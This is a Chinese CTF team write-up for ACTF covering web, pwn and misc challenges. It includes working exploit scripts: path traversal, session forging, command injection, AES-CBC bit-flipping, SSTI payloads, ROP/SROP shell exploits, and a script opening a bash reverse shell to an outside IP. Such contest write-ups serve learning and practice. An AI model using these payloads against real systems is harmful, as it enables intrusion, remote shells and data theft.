排名：22

大家都好厉害

## Web

### ACTF Upload

登陆框随便输入一个账号密码

上传文件后会有个文件读取功能，可以目录穿越

```http
GET /upload?file_path=../../../../proc/self/environ HTTP/1.1
Host: 223.112.5.141:62990
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJ1c2VybmFtZSI6IjEyMyJ9.aAxeCw.0dAncgwbeSQVYl6ZfJ1t-hrzfHc; 
sec-gpc: 1
Connection: keep-alive


```

读取环境变量可以拿到 flask secret\_key S3cRetK3y

然后读取 /proc/self/cmdline 拿到 python 路径 /app/app.py，然后读取 /app/app.py

```python
import uuid
import os
import hashlib
import base64
from flask import Flask, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY') # S3cRetK3y

@app.route('/')
def index():
    if session.get('username'):
        return redirect(url_for('upload'))
    else:
        return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin':
            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
                session['username'] = username
                return redirect(url_for('index'))
            else:
                flash('Invalid password')
        else:
            session['username'] = username
            return redirect(url_for('index'))
    else:
        return '''
        <h1>Login</h1>
        <h2>No need to register.</h2>
        <form action="/login" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <br>
            <input type="submit" value="Login">
        </form>
        '''

@app.route('/upload', methods=['POST', 'GET'])
def upload():
    if not session.get('username'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        f = request.files['file']
        file_path = str(uuid.uuid4()) + '_' + f.filename
        f.save('./uploads/' + file_path)
        return redirect(f'/upload?file_path={file_path}')
    
    else:
        if not request.args.get('file_path'):
            return '''
            <h1>Upload Image</h1>
            
            <form action="/upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" value="Upload">
            </form>
            '''
            
        else:
            file_path = './uploads/' + request.args.get('file_path')
            if session.get('username') != 'admin':
                with open(file_path, 'rb') as f:
                    content = f.read()
                    b64 = base64.b64encode(content)
                    return f'<img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image">'
            else:
                os.system(f'base64 {file_path} > /tmp/{file_path}.b64')
                # with open(f'/tmp/{file_path}.b64', 'r') as f:
                #     return f'<img src="data:image/png;base64,{f.read()}" alt="Uploaded Image">'
                return 'Sorry, but you are not allowed to view this image.'
                
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

根据源码可知 admin 用户在读取文件时存在命令注入

使用 flask-unsign 伪造 username 为 admin 的 session

```python
$ flask-unsign -s -c "{'username':'admin'}" --secret S3cRetK3y
eyJ1c2VybmFtZSI6ImFkbWluIn0.aAxcaw.FdFR_GEeed2xdGfbBGTuUi-tc1g
```

题目应该是不出网的，构造 ls / > /tmp/a.txt，然后读取 /tmp/a.txt

```http
GET /upload?file_path=`ls+/>/tmp/a.txt` HTTP/1.1
Host: 223.112.5.141:62990
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aAxcaw.FdFR_GEeed2xdGfbBGTuUi-tc1g
dnt: 1
sec-gpc: 1
Connection: keep-alive


```

可以知道 flag 放在了 /Fl4g\_is\_H3r3，最后读取 flag 位置

```http
GET /upload?file_path=../../../../Fl4g_is_H3r3 HTTP/1.1
Host: 223.112.5.141:62990
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJ1c2VybmFtZSI6IjEyMyJ9.aAxeCw.0dAncgwbeSQVYl6ZfJ1t-hrzfHc; 
sec-gpc: 1
Connection: keep-alive


```

### not so web 1

随便注册一个账户登陆后可以看到源码

```python
import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
)

app = Flask(__name__)
app.secret_key = KEY

@dataclass(kw_only=True)
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie: str) -> bool:
    if not cookie:
        return False

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        return False

    if len(cookie_encrypted) < 32:
        return False

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        cookie_json = cipher.decrypt(padded)
    except ValueError:
        return False

    try:
        _ = json.loads(cookie_json)
    except Exception:
        return False

    return True

def parse_cookie(cookie: str) -> Tuple[bool, str]:
    if not cookie:
        return False, ""

    try:
        cookie_encrypted = base64.b64decode(cookie, validate=True)
    except binascii.Error:
        return False, ""

    if len(cookie_encrypted) < 32:
        return False, ""

    try:
        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(padded)
        cookie_json_bytes = unpad(decrypted, 16)
        cookie_json = cookie_json_bytes.decode()
    except ValueError:
        return False, ""

    try:
        cookie_dict = json.loads(cookie_json)
    except Exception:
        return False, ""

    return True, cookie_dict.get("name")

def generate_cookie(user: APPUser) -> str:
    cookie_dict = asdict(user)
    cookie_json = json.dumps(cookie_dict)
    cookie_json_bytes = cookie_json.encode()
    iv = os.urandom(16)
    padded = pad(cookie_json_bytes, 16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(iv + encrypted).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    if not valid or not current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    if not user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">Welcome, %s !</h2>
        <div class="text-center">
            Your payload: %s
        </div>
        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">server code (encoded)</h2>
        <div class="text-center" style="word-break:break-all;">
        {%% raw %%}
            %s
        {%% endraw %%}
        </div>
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()

```

询问 ChatGPT 得知存在 AES CBC 字节翻转攻击，写了一下脚本

先注册 xxxxx/password 用户，登陆后拿到 cookie 填到下面的位置

```python
import base64
import json
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from dataclasses import dataclass, asdict

# 模拟server.py中的结构
@dataclass(kw_only=True)
class APPUser:
    name: str
    password_raw: str
    register_time: int

# 创建我们的测试用户（用户名长度与"admin"相同）
test_user = APPUser(name="xxxxx", password_raw="password", register_time=-1)
cookie_dict = asdict(test_user)
cookie_json = json.dumps(cookie_dict)

print(f"JSON数据: {cookie_json}")
print(f"JSON长度: {len(cookie_json)}")

# 确定"name"字段在JSON中的位置
name_pos = cookie_json.find('"name"')
print(f"name位置: {name_pos}")
name_value_pos = cookie_json.find('"xxxxx"')
print(f"name值位置: {name_value_pos + 1}")  # +1 跳过双引号

# 需要修改的是原始经过base64解码后的cookie
# 添加适当的填充使base64解码成功
original_cookie_base64 = "tTQN4mtdoxm5OLHVc01n1QVC68ncXQ2n2sB2dtYQupOLukWyu/9AnJj8bVzYyFCCSTFj0PHRUfZTyEoJPxzpMn0qzzv/nvllVcllfPE79/J4NFoVhTxsFsVcvoLyhxy7"
# 或者使用validate=False忽略填充检查
original_cookie_bytes = base64.b64decode(original_cookie_base64, validate=False)

# 现在计算需要的XOR操作
target_name = "admin"
original_name = "xxxxx"
diff = [ord(t) ^ ord(o) for t, o in zip(target_name, original_name)]

# 找到name值在哪个AES块中
block_size = 16
name_block = (name_value_pos + 1) // block_size
name_offset = (name_value_pos + 1) % block_size

print(f"name值在第{name_block}个块，偏移量{name_offset}")

# 构造修改后的cookie
modified_data = bytearray(original_cookie_bytes)
for i, d in enumerate(diff):
    if name_block == 0:
        # 如果name在第一个块，修改IV
        modified_data[name_offset + i] ^= d
    else:
        # 否则修改上一个块对应位置的密文
        modified_data[(name_block-1)*block_size + name_offset + i] ^= d

fake_admin_cookie = base64.b64encode(modified_data).decode()
print(f"伪造的admin cookie: {fake_admin_cookie}")

```

```javascript
$ python exploit.py
JSON数据: {"name": "xxxxx", "password_raw": "password", "register_time": -1}
JSON长度: 66
name位置: 1
name值位置: 10
name值在第0个块，偏移量10
伪造的admin cookie: tTQN4mtdoxm5OKjJZlxx1QVC68ncXQ2n2sB2dtYQupOLukWyu/9AnJj8bVzYyFCCSTFj0PHRUfZTyEoJPxzpMn0qzzv/nvllVcllfPE79/J4NFoVhTxsFsVcvoLyhxy7
```

之后是一个经典的 ssti

```http
GET /home?payload={{7*7}} HTTP/1.1
Host: 61.147.171.105:52418
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: jwbcookie=tTQN4mtdoxm5OKjJZlxx1QVC68ncXQ2n2sB2dtYQupOLukWyu/9AnJj8bVzYyFCCSTFj0PHRUfZTyEoJPxzpMn0qzzv/nvllVcllfPE79/J4NFoVhTxsFsVcvoLyhxy7
dnt: 1
sec-gpc: 1
Connection: keep-alive


```

fenjing 一把梭

```http
fenjing crack -u http://61.147.171.105:52418/home --cookies 'jwbcookie=tTQN4mtdoxm5OKjJZlxx1QVC68ncXQ2n2sB2dtYQupOLukWyu/9AnJj8bVzYyFCCSTFj0PHRUfZTyEoJPxzpMn0qzzv/nvllVcllfPE79/J4NFoVhTxsFsVcvoLyhxy7' -m GET -i payload
```

```sql
[INFO] | Adding some string variables...
[INFO] | Start generating final expression...
[INFO] | Great! gen_string_1 says string('\'"generate_me": os.popen("cat /f*
./f*").read(),\'') can be '\'"generate_me": os.popen("cat /f* ./f*").read(),\''
[INFO] | Searching flags...
[INFO] | Adding some string variables...
[INFO] | Start generating final expression...
[INFO] | Great! we generate eval_func()
[INFO] | Great! we generate eval(('item', ('attribute', ('flask_context_var', 'request'),
'values'), 'eval_this'))
[INFO] | Submit payload
{{sbwaf.__eq__.__globals__.__builtins__.eval(request.values.eval_this)}}
[INFO] | This might be your flag:
[INFO] | ['ACTF{n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie}']
[INFO] | No thanks.
```

### Excellent-Site

smtp header 注入，伪造 From 为 admin@ezmail.org

后面 admin 会 fetch content 然后执行 SSTI，不过在 fetch 的时候存在 SSRF 检测，直接利用程序本身的 SQL 注入构造 payload 就可以绕过

```python
import requests
from urllib.parse import quote
import base64

url = 'http://61.147.171.105:57764/'

eval_payload = '''__import__('os').popen('bash -c "bash -i >& /dev/tcp/120.55.184.209/65123 0>&1"').read()'''

payload = r'{{sbwaf.__eq__.__globals__.__builtins__.eval("eval(__import__(\"base64\").b64decode(\"' + base64.b64encode(eval_payload.encode()).decode() + r'\").decode())")}}'

param = quote("0 union select '" + payload + "'")

report_url = 'http://ezmail.org:3000/news?id=' + param + '\r\nFrom: admin@ezmail.org'

content = 'hello\r\n.\r\nFrom: admin@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: http://ezmail.org:3000/news?id=' + param + '\r\n\r\nhello'

resp = requests.post(url + '/report', data={'url': report_url, 'content': content})
print(resp.text)

resp = requests.get(url + '/bot')
print(resp.text)
```

### not so web 2

```python
import base64, json, time
import os, sys, binascii
from dataclasses import dataclass, asdict
from typing import Dict, Tuple
from secret import KEY, ADMIN_PASSWORD
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    flash,
    session,
    abort,
)

app = Flask(__name__)
app.secret_key = KEY

if os.path.exists("/etc/ssl/nginx/local.key"):
    private_key = RSA.importKey(open("/etc/ssl/nginx/local.key", "r").read())
else:
    private_key = RSA.generate(2048)

public_key = private_key.publickey()

@dataclass
class APPUser:
    name: str
    password_raw: str
    register_time: int

#  In-memory store for user registration
users: Dict[str, APPUser] = {
    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
}

def validate_cookie(cookie_b64: str) -> bool:
    valid, _ = parse_cookie(cookie_b64)
    return valid

def parse_cookie(cookie_b64: str) -> Tuple[bool, str]:
    if not cookie_b64:
        return False, ""

    try:
        cookie = base64.b64decode(cookie_b64, validate=True).decode()
    except binascii.Error:
        return False, ""

    try:
        msg_str, sig_hex = cookie.split("&")
    except Exception:
        return False, ""

    msg_dict = json.loads(msg_str)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = bytes.fromhex(sig_hex)
    try:
        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)
        valid = True
    except (ValueError, TypeError):
        valid = False
    return valid, msg_dict.get("user_name")

def generate_cookie(user: APPUser) -> str:
    msg_dict = {"user_name": user.name, "login_time": int(time.time())}
    msg_str = json.dumps(msg_dict)
    msg_str_bytes = msg_str.encode()
    msg_hash = SHA256.new(msg_str_bytes)
    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)
    sig_hex = sig.hex()
    packed = msg_str + "&" + sig_hex
    return base64.b64encode(packed.encode()).decode()

@app.route("/")
def index():
    if validate_cookie(request.cookies.get("jwbcookie")):
        return redirect(url_for("home"))
    return redirect(url_for("login"))

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        user_name = request.form["username"]
        password = request.form["password"]
        if user_name in users:
            flash("Username already exists!", "danger")
        else:
            users[user_name] = APPUser(
                name=user_name, password_raw=password, register_time=int(time.time())
            )
            flash("Registration successful! Please login.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username in users and users[username].password_raw == password:
            resp = redirect(url_for("home"))
            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
            return resp
        else:
            flash("Invalid credentials. Please try again.", "danger")
    return render_template("login.html")

@app.route("/home")
def home():
    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
    if not valid or not current_username:
        return redirect(url_for("logout"))

    user_profile = users.get(current_username)
    if not user_profile:
        return redirect(url_for("logout"))

    if current_username == "admin":
        payload = request.args.get("payload")
        if payload:
            for char in payload:
                if char in "'_#&;":
                    abort(403)
                    return

        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">Welcome, %s !</h2>
        <div class="text-center">
            Your payload: %s
        </div>
        <img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image">
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
""" % (
            current_username,
            payload,
        )
    else:
        html_template = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <h2 class="text-center">server code (encoded)</h2>
        <div class="text-center" style="word-break:break-all;">
        {%% raw %%}
            %s
        {%% endraw %%}
        </div>
        <div class="text-center">
            <a href="/logout" class="btn btn-danger">Logout</a>
        </div>
    </div>
</body>
</html>
"""
            % base64.b64encode(open(__file__, "rb").read()).decode()
        )
    return render_template_string(html_template)

@app.route("/logout")
def logout():
    resp = redirect(url_for("login"))
    resp.delete_cookie("jwbcookie")
    return resp

if __name__ == "__main__":
    app.run()

```

parse\_cookie 的时候存在缺陷

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404510.png)

注册一个账户 123/123，登陆后拿到 cookie

然后把 username 改成 admin

```http
GET /home?payload=123 HTTP/1.1
Host: 61.147.171.106:62996
Cookie: jwbcookie=eyJ1c2VyX25hbWUiOiAiYWRtaW4iLCAibG9naW5fdGltZSI6IDE3NDU2NjM5MTJ9JjJkYTFjNzI3YWZiZTAxZjE5YTRhYjM4YWJlNjc0NDRhYjViOWViZjJmM2M4NGM3YTM5ZWQzYWY2YjBlNzVjZWU0ODI0ZWI1ZjBiZWNlOThlYzgyZDk3YzA4MTBiMTY2ZjdhNTFkOWM0NmNjZjljMmNkZGY0MWE5M2FhNDcxMWEyNjVjNjIwOTZjZTk2NzRkYTg2MDQyZmQxNDUxN2VmNjNlNzUxYjFiNDc1Yzc0YjI2NTIyNWViZmY3N2M5MzRkYThiZDM0MTAwM2ZkZTJmY2QwMjVjOTFiNzM5NGY3OWFjNmVjNTIyOWM1YTllOTVhZDgyYzNhMmQyNDJlZmI3OTU0NWZkNTA5NTM0ZGE0MGVhNDliOTM1YjMyZTE5ZWI1NTE3YzFlOWUwOGNmNTE3NGY0YmJmMWY2MGNlNDgzMDE2OTQwNjcxMTg2OWFmMGQ1YTU5MzQwNzlmMDY5NTViYzFkMTVhOWYwY2Q3N2M0YzQ1MjVhZGQ2MmRlZWQzMjBiZmVjZmQ2MTg3YTc3ZDc0ZDUxN2U2NzE0MThmZTQ4NzBjYTI2YzM1MWQ2NzkxZWQ1ZWIwZDZmNDk1ZTIwYmQ0ODAyYWY3NWQ0NThjMmQ5MTcxZDExZjE1YTUzNTI5ZmU0YzI4YzA0ZmQ4YzYwY2U4ZTk2ODdjZmNlYzhlOTNmNzA2
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive


```

之后 fenjing 一把梭

```http
fenjing crack -u https://61.147.171.106:62996/home --cookies 'jwbcookie=eyJ1c2VyX25hbWUiOiAiYWRtaW4iLCAibG9naW5fdGltZSI6IDE3NDU2NjM5MTJ9JjJkYTFjNzI3YWZiZTAxZjE5YTRhYjM4YWJlNjc0NDRhYjViOWViZjJmM2M4NGM3YTM5ZWQzYWY2YjBlNzVjZWU0ODI0ZWI1ZjBiZWNlOThlYzgyZDk3YzA4MTBiMTY2ZjdhNTFkOWM0NmNjZjljMmNkZGY0MWE5M2FhNDcxMWEyNjVjNjIwOTZjZTk2NzRkYTg2MDQyZmQxNDUxN2VmNjNlNzUxYjFiNDc1Yzc0YjI2NTIyNWViZmY3N2M5MzRkYThiZDM0MTAwM2ZkZTJmY2QwMjVjOTFiNzM5NGY3OWFjNmVjNTIyOWM1YTllOTVhZDgyYzNhMmQyNDJlZmI3OTU0NWZkNTA5NTM0ZGE0MGVhNDliOTM1YjMyZTE5ZWI1NTE3YzFlOWUwOGNmNTE3NGY0YmJmMWY2MGNlNDgzMDE2OTQwNjcxMTg2OWFmMGQ1YTU5MzQwNzlmMDY5NTViYzFkMTVhOWYwY2Q3N2M0YzQ1MjVhZGQ2MmRlZWQzMjBiZmVjZmQ2MTg3YTc3ZDc0ZDUxN2U2NzE0MThmZTQ4NzBjYTI2YzM1MWQ2NzkxZWQ1ZWIwZDZmNDk1ZTIwYmQ0ODAyYWY3NWQ0NThjMmQ5MTcxZDExZjE1YTUzNTI5ZmU0YzI4YzA0ZmQ4YzYwY2U4ZTk2ODdjZmNlYzhlOTNmNzA2' -m GET -i payload --no-verify-ssl
```

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404511.png)

## Pwn

### only read

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404512.png)

真就只有read(

甚至把csu都剔除了,看来没法使用magic\_gadget了

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404513.png)

保护的话就开了NX,got表可写,那仍然可以重定向,只是会麻烦很多

我的想法是,使用rop对在read.got进行微量偏移,使得read.got->syscall

这样可以打ret2syscall

```bash
from pwn import *
#io=process('./pwn')
io=remote("1.95.199.251",9999)
libc=ELF('./libc.so.6')
context.arch='amd64'
context.log_level='debug'
def bug():
    gdb.attach(io)
def con():
    io.recvuntil(b"Submit the token generated by `")
    key=io.recvuntil(b"`")[:-1]
    token = os.popen(key.decode()).read().strip().encode()
    io.sendline(token)
    io.recvuntil(b"Here is your challenge~")
con()
bss=0x404800
got=0x404000#-->0x5f
read=0x401142
leave=0x40115D
tar=0x404088
t2=0x404880
t3=0x404888
eax=0x401158
rbp=0x40111D
#==============================================================
payload=b'\x00'*0x80+p64(tar+0x80-0x8)+p64(read)
io.send(payload)
pause()
payload=p64(bss+0x100-0x88)+p64(read+4)
payload=payload.ljust(0x80,b'\x00')+p64(bss-0x100)+p64(read)
io.send(payload)
pause()
```

在对read.got进行微量偏移前还需要在bss上提前布置rop,因为使用read进行微量偏移后

rsp会来到read.got+0x80的位置,此时任然可以控制执行流

但此时我遇到了一个很棘手的问题:无论是想syscall\_sigretrun=>eax=0xf还是syscall\_execv=>eax=0x3b,一般eax可以通过read的返回值控制,但是此时我们的rsi被钉在了read.got处,如果读入0xf字节会破坏read.got中的内容,于是这个东西卡了我好久好久....

最后无数次调试确认了eax不能用read控制,

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404514.png)

这里间接引用了rax为read传参,这样是对我们的一大阻塞,因为我们没法利用main函数结尾处的mov eax,0进行read-syscall,但是这也给我了一个思路:不如就用这里的gadget控制rax为0xf,此时call read会调用syscall进行sigreturn,那我只需提前在bss上布置好sigreturnframe就好了:)

我们还需要进行一次失败的read\_syscall将rsp迁出read.got,而且进行sigreturn时rsp会指向我们sigreturn.rop的最后八个字节,但是没关系不会对execv\_syscall造成影响

还需要在bss上布置好/bin/sh

```bash
from pwn import *
#io=process('./pwn')
io=remote("1.95.199.251",9999)
libc=ELF('./libc.so.6')
context.arch='amd64'
context.log_level='debug'
def bug():
    gdb.attach(io)
def con():
    io.recvuntil(b"Submit the token generated by `")
    key=io.recvuntil(b"`")[:-1]
    token = os.popen(key.decode()).read().strip().encode()
    io.sendline(token)
    io.recvuntil(b"Here is your challenge~")
con()
bss=0x404800
got=0x404000#-->0x5f
read=0x401142
leave=0x40115D
tar=0x404088
t2=0x404880
t3=0x404888
eax=0x401158
rbp=0x40111D
#==============================================================
payload=b'\x00'*0x80+p64(tar+0x80-0x8)+p64(read)
io.send(payload)
pause()
payload=p64(bss+0x100-0x88)+p64(read+4)
payload=payload.ljust(0x80,b'\x00')+p64(bss-0x100)+p64(read)
io.send(payload)
pause()
#===============================================================
s=SigreturnFrame()
bin_sh=0x404718
s.rax=0x3b
s.rdi=bin_sh
s.rdx=0
s.rsi=0
s.rip=0x401044
payload =p64(bss).ljust(0x80,b'\x00')+p64(got+0x80)+p64(read)+p64(leave)
payload+=b"/bin/sh\x00"+b'\x00'*0x160+p64(rbp)+p64(0xf+0x80)+p64(read)+bytes(s)[8:]
io.send(payload)
pause()
io.send(b'\x5f')
pause()
io.sendline(b'a')
io.interactive()

#ACTF{5ystem_c4nnot_be_1nvoc4ked_@fter_corrupt1n9_1inkm4p}
```

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404515.png)

多次的读入可以用pause()进行分割使得io.send的数据不会集中在一个read中

## Misc

### Signin | solved

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404516.png)



### Hard guess | Solved

```plain&#x20;text
ssh账号密码：
KatoMegumi
Megumi960923
```

查找suid权限发现/opt/hello

反编译后

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404517.png)

注意到用的是sh，/bin/bash转换成bash，然后利用BASH\_ENV执行命令（前面执行ls /root的部分与cat /root/flag方法相同）

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404518.png)



### master of movie | Solved

ACTF{IMDBMASTER\_uw@tcHed@L0toFmoV1e|tt0118694}

#### EASY （10/10）

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404519.png)

电影：股疯（checked)

IMDB: tt0109946

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404520.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404521.png)

IMDB: tt0017136(checked)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404522.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404523.png)

IMDB: tt34382036（checked)

就是这个：ナンバーワン戦隊ゴジュウジャー



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404524.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404525.png)

IMDB: tt17526714(checked)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404526.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404527.png)

IMDB: tt8503618（checked)

